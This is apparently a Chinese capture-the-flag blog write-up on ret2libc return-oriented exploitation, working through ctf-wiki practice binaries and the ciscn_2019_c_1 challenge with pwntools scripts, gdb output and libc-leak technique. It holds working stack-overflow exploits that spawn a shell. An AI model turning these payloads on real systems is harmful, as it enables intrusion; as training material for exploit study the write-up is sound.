---
title: 「PWN」BasicROP　-　Ret2Libc
description: 文章由作者nova撰写，主要分享了他在进行CTF（Capture The Flag）比赛中学习并应用ROP（Return-Oriented
  Programming）技术中的Ret2Libc攻击方法的经验。文章详细介绍了三个不同难度的Ret2Libc攻击实例，并提供了解决每个实例的方法和代码示例。
pubDate: 2021-12-12
tags:
- CTF
- Pwn
authors:
- nova
---

# Basic ROP - Ret2libc

痛定思痛了属于是，连续几次比赛一题做不出来，得到了 zbr 爹的~~指~~指点~~点~~，决定自裁。

整。

<!--truncate-->

## ret2libc1

检查一下保护，没有 Canary 也没有 PIE，32 位 ELF

![](https://oss.nova.gal/img/image-20211212102309182.png)

在 string 列表里即看得到`system`也看得到`/bin/sh`

![](https://oss.nova.gal/img/image-20211212102632678.png)

简单的构造一个函数覆盖返回地址即可

```python
from pwn import *

context.log_level='DEBUG'
context.arch='amd64'
context.os='linux'

sh = process("./ret2libc1")
elf = ELF("./ret2libc1")

system_addr = 0x8048460  # plt
# system_addr = elf.plt["system"]  # it works as well
binsh_addr = 0x08048720
sh.recvuntil(b"RET2LIBC >_<\n")

payload = b'A'*(0x6c+0x04) + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()

```

说一下一些点

- system 的地址应取 plt 表里的 system，而不是 string 里看到的那个 system。原因参见 PLT / GOT - 动态绑定

- 这题中在 IDA 中可以看到`char s[100]; // [esp+1Ch] [ebp-64h] BYREF`，距离 ebp 是`0x64 bytes`，但实际上却是`0x6c bytes`

  - 这里附上 mark 爹的解答

    ![](https://oss.nova.gal/img/image-20211212105927823.png)

  - 那如何计算偏移呢？这里提供 gdb 和 pwndbg 的两种方法

    - gdb

      - 找到 call \_gets 的地址，可以看到上面就是 s

      ![](https://oss.nova.gal/img/image-20211212110511113.png)

      - 我们在 0x0804867B 这里下一个断点

        ```shell
        gdb ./ret2libc
        b *0x0804867E
        r
        ```

        ```shell
        Breakpoint 2, 0x0804867e in main () at ret2libc1.c:27
        27	in ret2libc1.c
        LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        ──────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────
         EAX  0xffffcf3c ◂— 0x0
         EBX  0x0
         ECX  0xffffffff
         EDX  0xffffffff
         EDI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
         ESI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
         EBP  0xffffcfa8 ◂— 0x0
         ESP  0xffffcf20 —▸ 0xffffcf3c ◂— 0x0
        *EIP  0x804867e (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8
        ────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────
           0x804867b <main+99>              mov    dword ptr [esp], eax
         ► 0x804867e <main+102>             call   gets@plt                     <gets@plt>
                arg[0]: 0xffffcf3c ◂— 0x0
                arg[1]: 0x0
                arg[2]: 0x1
                arg[3]: 0x0

           0x8048683 <main+107>             mov    eax, 0
           0x8048688 <main+112>             leave
           0x8048689 <main+113>             ret

           0x804868a                        nop
           0x804868c                        nop
           0x804868e                        nop
           0x8048690 <__libc_csu_init>      push   ebp
           0x8048691 <__libc_csu_init+1>    push   edi
           0x8048692 <__libc_csu_init+2>    xor    edi, edi
        ────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
        00:0000│ esp 0xffffcf20 —▸ 0xffffcf3c ◂— 0x0
        01:0004│     0xffffcf24 ◂— 0x0
        02:0008│     0xffffcf28 ◂— 0x1
        03:000c│     0xffffcf2c ◂— 0x0
        ... ↓        2 skipped
        06:0018│     0xffffcf38 —▸ 0xf7ffd000 ◂— 0x2bf24
        07:001c│ eax 0xffffcf3c ◂— 0x0
        ──────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────
         ► f 0 0x804867e main+102
           f 1 0xf7de7ee5 __libc_start_main+245
           f 2 0x80484f1 _start+33
        ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        ```

        在寄存器[REGISTERS]中我们可以看到 s 的地址是`0xffffcf3c`，对于 ESP 的地址`0xffffcf20`的偏移是`0x1c`，这与我们在 IDA 中所看到的是一致的。同时，注意到 EBP 的地址`0xffffcfa8`，经过小学二年级的加减法即可得出 EBP 和 ESP 的偏移是`0x88`，那 EBP 与 s 的偏移也就是`0x88-0x1c = 0x6c`了，在 IDA 中却看到`[ebp-64h]`，不李姐

    - pwnbdg

      这个我暂时没用太明白（），写完了去看看 pwndbg 的 documents

      - 首先生成点垃圾字符

        ```shell
        pwndbg> cyclic 200
        aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
        ```

      - 再次运行程序，输入生成的垃圾字符

        ```shell
        pwndbg> r
        Starting program: /home/nova/Desktop/CTF/ctf-wiki/ret2libc/ret2libc1
        RET2LIBC >_<
        aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

        Program received signal SIGSEGV, Segmentation fault.
        0x62616164 in ?? ()
        LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        ──────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────
         EAX  0x0
         EBX  0x0
         ECX  0xf7fb4580 (_IO_2_1_stdin_) ◂— 0xfbad2288
         EDX  0xffffd004 —▸ 0xf7fe7b00 ◂— push   eax /* 'Pj' */
         EDI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
         ESI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
         EBP  0x62616163 ('caab')
         ESP  0xffffcfb0 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
         EIP  0x62616164 ('daab')
        ────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────
        Invalid address 0x62616164
        ```

      - 此时看到它给出了一个 Invalid address

        执行`cyclic -l addr`

        ```shell
        pwndbg> cyclic -l 0x62616164
        112
        ```

        112 就是 s 对于返回地址的偏移值（非常的 Amazing 啊）

- system 函数也有返回地址，所以在中间要补一个函数，`0xdeadbeef`是我自己的恶趣味（），写`p32(0)`或者`b"AAAA"`就可以了、

- 32 位传参就是从栈上从右向左拿参数，64 位前六个参数则需是通过寄存器`rdi,rsi,rdx,rcx,r8,r9`的顺序传参，剩余的则按照 32 位从右向左取栈

## ret2libc2

这题在 ret2libc1 的基础上去掉了`binsh`字符串。也就是说，我们需要自己构建一个`gets`输入`/bin/sh`并作为`system`的参数引用。

在`vmmap`中可以看到 data 这个内存页是可写的

```shell
0x804a000  0x804b000 rw-p     1000 1000   /home/nova/Desktop/CTF/ctf-wiki/ret2libc/ret2libc2
```

![](https://oss.nova.gal/img/image-20211214121414814.png)

那么我们考虑将`/bin/sh`写入到 bss 段上的`buf2`处

![image-20211214121848183](https://oss.nova.gal/img/image-20211214121848183.png)

思路很明显了：

- 在程序的 gets 中覆盖返回地址到我们新的 gets
- 新的 gets 将输入存到 buf2 地址处，并返回到 system 函数
- system 函数调用 buf2 处的数据作为参数

接下来就是如何编写 payload

给出两个 exp。

### EXP1

```python
from pwn import *

sh = process('./ret2libc2')
elf = ELF("./ret2libc2")

get_plt = elf.plt["gets"]
system_plt = elf.plt["system"]
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

在这里，新构建的`gets`的返回地址是`pop_ebx`，主要目的是为了栈帧平衡

> `pop ebx; ret`
>
> `pop ebx`将栈顶数据取出存放至 ebx，esp+4
>
> `ret`将栈顶数据取出存放至 eip，esp+4
>
> 这样 esp 就指向了我们的`system_plt`，对应的，`0xdeadbeef`作为 system 的返回地址，随便填

### EXP2

```python
from pwn import *

sh = process("./ret2libc2")
elf = ELF("./ret2libc2")

system_plt = elf.plt["system"]
buf_addr = 0x804a080
get_plt = elf.plt["gets"]

sh.recvuntil(b"you think ?")
payload = b'A'*(0x6c+0x04) + p32(get_plt) + p32(system_plt) + p32(buf_addr) + p32(buf_addr)
sh.sendline(payload)
sh.sendline("/bin/sh")
sh.interactive()
```

在这里，我们直接将`system_plt`作为`gets`的返回地址。

此时要注意的是，由于没有平衡栈帧，第一个`p32(buf_addr)`其实进行了一手复用，它既作为`gets`的参数，又作为`system`的返回地址。

## ret2libc3

对于 pwn 来说，整明白了这个应该才算刚刚入门:(

没有 system，没有 binsh，靠延迟绑定泄露已经执行过函数的真实地址算出偏移与基地址搞到 system 和 binsh 的地址

在这里我们泄露`puts`的地址好了

![](https://oss.nova.gal/img/image-20211214151738631.png)

首先搞到`puts`的 plt 和 got 表地址

```python
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['_start']
```

覆盖`main`的返回地址到`puts`，参数为`puts_got`，返回到`main`

> 我们返回到 main 时最好返回到`_start`，若返回到`main`的话，溢出的偏移会**-8bytes**
>
> > 程序入口`_start` -> `_libc_start_main` -> `main`

因为 puts 已经调用过一次，所以此时`puts_got`表存的内容就是`puts`的真实地址

```python
payload = b'A'*112
payload += p32(puts_plt) + p32(main_addr) + p32(puts_got)
sh.recvuntil(b"it !?")
sh.sendline(payload)

puts_addr = u32(sh.recv()[:4]) # 32位ELF，所以切前四位即可
print("puts_addr: ", hex(puts_addr))
```

此时我们可以算出 libc 的偏移值

`libc_base = puts_addr - libc.sys['gots']`

有了偏移值，system 和 binsh 的地址也就出来了

### EXP1

```python
from pwn import *

context.log_level='DEBUG'
context.arch='amd64'
context.os='linux'

sh = process("./ret2libc3")
elf = ELF("./ret2libc3")
libc = ELF("/usr/lib/i386-linux-gnu/libc-2.31.so")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['_start']

payload = b'A'*112
payload += p32(puts_plt) + p32(main_addr) + p32(puts_got)
sh.recvuntil(b"it !?")
sh.sendline(payload)

puts_addr = u32(sh.recv()[:4])
print("puts_addr: ", hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
print(hex(libc_base))
sys_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A'*112
payload2 += p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
gdb.attach(sh, 'b gets')
sh.sendline(payload2)
sh.interactive()
```

### EXP2

```python
from pwn import *

context.log_level='DEBUG'
context.arch='amd64'
context.os='linux'

sh = process("./ret2libc3")
elf = ELF("./ret2libc3")
libc = ELF("/usr/lib/i386-linux-gnu/libc-2.31.so")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload = b'A'*112
payload += p32(puts_plt) + p32(main_addr) + p32(puts_got)
sh.recvuntil(b"it !?")
sh.sendline(payload)

puts_addr = u32(sh.recv()[:4])
print("puts_addr: ", hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
print(hex(libc_base))
sys_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A'*104
payload2 += p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
gdb.attach(sh, 'b gets')
sh.sendline(payload2)
sh.interactive()
```

### LIBC 版本查找

> 虽然说现在题基本上都有`libc.so`，但是以防万一还是给一个求 libc 版本的方法

[libc database search](https://libc.blukat.me/)

使用方法很简单，因为 libc 的低十二位不会变，所以给出已泄露的函数的地址，就可以在这里找到对应的 libc.so 版本及相关 Offset

![image-20211214164955101](https://oss.nova.gal/img/image-20211214164955101.png)

## ciscn_2019_c_1

[题目](https://buuoj.cn/challenges#ciscn_2019_c_1)

大体上和 ret2libc3 相同，不过是 64bits 的，算是一个从 32->64 的转变的题目

直接上 exp(本地)

```python
from pwn import *

context.log_level='DEBUG'
context.arch='amd64'
context.os='linux'
sh = process("./ciscn_2019_c_1")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
elf = ELF("./ciscn_2019_c_1")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
encrypt_addr = elf.symbols['encrypt']
pop_rdi_ret = 0x0400c83
ret = 0x4006b9

sh.recvuntil(b"Input your choice!\n")
sh.sendline(b'1')

payload = b'A' * (0x50+0x08) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)
sh.recvuntil("Input your Plaintext to be encrypted\n")
sh.sendline(payload)
sh.recvuntil("Ciphertext\n")
sh.recvline()
puts_addr = u64(sh.recvuntil('\n', drop=True).ljust(8, b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
payload2 = b'A' * (0x50+0x08) + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(0)
sh.recvuntil(b"Input your Plaintext to be encrypted\n")
sh.sendline(payload2)
sh.interactive()

```

几个需要注意的点：

- 因为是 64 位，所以前面 6 个参数传参时候需要使用寄存器`rdi,rsi,rdx,rcx,r8,r9`，需要找 ROPgadgets

- payload2 当中的 p64(ret)是为了堆栈平衡防止虚拟机崩溃（崩了八万次了），详情可看[「BUUCTF」Pwn - Rip Ubuntu18 中 64 位 ELF 在调用 system 时候可能出现的问题](https://nova.gal/2021/11/29/BUUCTF-The-problem-I-met-in-RIP/)

# 特别感谢

[Mark 爹](https://blog.mark0519.com)可以说是手把手教了我 GDB 的用法，甚至录了个半小时的视频！直接三个响头的磕 ❤❤❤
